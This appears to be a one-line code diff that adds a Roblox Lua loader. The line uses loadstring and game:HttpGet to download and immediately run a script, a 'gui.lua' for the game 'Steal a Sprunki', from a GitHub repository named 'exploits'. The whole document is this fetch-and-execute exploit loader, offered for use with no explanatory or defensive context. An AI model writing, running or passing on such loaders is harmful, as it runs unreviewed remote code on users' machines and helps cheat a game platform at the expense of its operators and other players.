@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/G1aD05/exploits/refs/heads/main/Steal%20a%20Sprunki/gui.lua'))()
